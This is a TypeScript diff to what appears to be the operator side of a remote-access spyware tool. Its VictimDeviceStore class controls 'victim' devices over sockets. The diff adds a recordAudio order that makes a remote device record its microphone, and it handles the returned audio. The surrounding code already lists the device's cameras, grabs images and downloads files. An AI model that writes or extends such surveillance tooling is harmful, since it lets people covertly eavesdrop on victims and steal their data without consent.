@@ -43,6 +43,7 @@ export class VictimDeviceStore implements IBaseEntity, IVictim {
     public cameras: CameraItem[] = [];
     public imageDataUrl: string | null = null;
     public files: FileListItem[] = [];
+    public audioDataUrl: string | null = null;
 
     public constructor(input: IBaseEntity & IVictim) {
         this.id = input.id;
@@ -72,10 +73,12 @@ export class VictimDeviceStore implements IBaseEntity, IVictim {
             connectionStatus: observable,
             imageDataUrl: observable,
             files: observable,
+            audioDataUrl: observable,
             open: observable,
             setCameras: action,
             setFiles: action,
             setImage: action,
+            setAudio: action,
             setOpen: action,
             setConnectionStatus: action,
         });
@@ -157,6 +160,12 @@ export class VictimDeviceStore implements IBaseEntity, IVictim {
                 saveAs(new Blob([Buffer.from(data.buffer)]), data.name);
             }
         });
+
+        this.socket.on(VictimOrder.MICROPHONE, (data) => {
+            console.log(`[VICTIM] Recording audio from ${this.deviceId}`);
+
+            this.setAudio(Buffer.from(data.buffer));
+        });
     }
 
     public listCameras(): void {
@@ -187,6 +196,18 @@ export class VictimDeviceStore implements IBaseEntity, IVictim {
             extra: 'dl',
             path,
         });
+    }
+
+    public recordAudio(seconds: number): void {
+        this.socket.emit(ServerToVictimEvents.VICTIM_ORDER, {
+            order: VictimOrder.MICROPHONE,
+            sec: seconds,
+        });
+    }
+
+    public setAudio(audio: Buffer | null): void {
+        this.audioDataUrl =
+            audio !== null ? bufferToDataUrl(audio, 'audio/mp3') : null;
     }
 
     public setCameras(cameras: CameraItem[]): void {
